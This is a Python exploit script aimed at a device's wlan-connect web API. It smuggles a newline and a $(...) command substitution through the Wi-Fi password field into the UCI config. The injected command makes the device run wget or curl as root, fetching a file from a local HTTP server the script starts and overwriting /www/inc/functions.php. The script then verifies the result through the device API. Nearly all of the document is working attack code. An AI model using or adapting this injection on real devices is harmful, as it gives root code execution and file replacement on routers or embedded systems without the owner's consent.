import requests
import time
import threading
import http.server
import socketserver
import os

TARGET_IP = "192.168.1.173"
TARGET_URL = f"http://{TARGET_IP}/api/index.php?url=wlan-connect"
CHECK_URL = f"http://{TARGET_IP}/api/tlc/1"
LOCAL_IP = "192.168.1.11"
PORT = 8000
PAYLOAD_DIR = "payload"

class QuietHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

requested_file = False

class RequestHandler(QuietHandler):
    def do_GET(self):
        global requested_file
        if "functions.php" in self.path:
            print(f"[+] Server: Device requested functions.php from {self.client_address[0]}")
            requested_file = True
        super().do_GET()

def start_server():
    os.chdir(PAYLOAD_DIR)
    with socketserver.TCPServer(("", PORT), RequestHandler) as httpd:
        print(f"[+] Server started at http://{LOCAL_IP}:{PORT}")
        httpd.serve_forever()

def exploit():
    # Payload injection into 'password' field to add 'option ifname' to UCI config.
    # This executes command as root via wifi script (netifd).
    # We use wget to download functions.php.
    # Note: \n must be sent as actual newline character in POST data.
    
    cmd = f"wget -O /www/inc/functions.php http://{LOCAL_IP}:{PORT}/functions.php || curl -o /www/inc/functions.php http://{LOCAL_IP}:{PORT}/functions.php"
    
    # We inject a dummy key, then new line, then option ifname with payload
    injection = f"dummy\noption ifname '$({cmd})'"
    
    print(f"[+] Target URL: {TARGET_URL}")
    print(f"[+] Payload Injection: {injection}")
    
    data = {
        'name': 'ExploitSSID',
        'password': injection
    }
    
    print("[+] Sending exploit request as JSON... (Network restart may cause timeout)")
    try:
        # Use json=data to send JSON body as required by wlan-connect.php
        requests.post(TARGET_URL, json=data, timeout=5)
    except requests.exceptions.ReadTimeout:
        print("[+] Request timed out (expected due to network restart)")
    except Exception as e:
        print(f"[!] Request failed with error: {e}")

    print("[+] Waiting for device to fetch payload and restart network...")
    # Wait for up to 60 seconds for the file request
    for i in range(60):
        if requested_file:
            print("[+] SUCCESS: Device requested functions.php!")
            break
        time.sleep(1)
    
    if not requested_file:
        print("[-] Warning: Device did not request the file. Exploit might have failed.")
    
    print("[+] Waiting for network to stabilize (30s)...")
    time.sleep(30)
    
    # Restore config (optional, but good practice to remove exploit)
    # We just set a clean config.
    print("[+] Restoring clean config...")
    try:
        restore_data = {'name': 'CleanSSID', 'password': 'cleanpassword'}
        requests.post(TARGET_URL, data=restore_data, timeout=10)
    except:
        pass

    print("[+] Verifying fix via API...")
    try:
        response = requests.get(CHECK_URL, timeout=10)
        if response.status_code == 200:
            data = response.json()
            # Handle list or object
            if isinstance(data, list) and len(data) > 0:
                data = data[0]
            
            ip = data.get('ip')
            print(f"[+] API Response IP: {ip}")
            if ip and ip != "1.1.1.1":
                print("[+] VERIFICATION SUCCESS: IP is correctly reported!")
            else:
                print("[-] VERIFICATION FAILED: IP is still 1.1.1.1 or missing.")
        else:
            print(f"[-] API check failed: Status {response.status_code}")
    except Exception as e:
        print(f"[-] API check failed: {e}")

if __name__ == "__main__":
    # Start server in background thread
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()
    
    # Give server a moment to start
    time.sleep(2)
    
    exploit()
